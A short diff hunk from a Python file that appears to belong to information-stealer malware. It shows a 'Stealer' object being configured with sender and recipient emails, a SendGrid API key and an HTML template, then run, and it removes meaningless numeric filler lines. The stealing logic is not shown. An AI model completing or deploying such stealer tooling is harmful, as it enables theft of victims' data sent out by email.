@@ -149,9 +149,3 @@ class Stealer:
 stealer = Stealer(config.from_email, config.to_email, config.send_grid_api)
 stealer.html_template = config.html_email
 stealer.run()
-
-var = -4283
-print(var)
-
-var = -33830
-print(var)
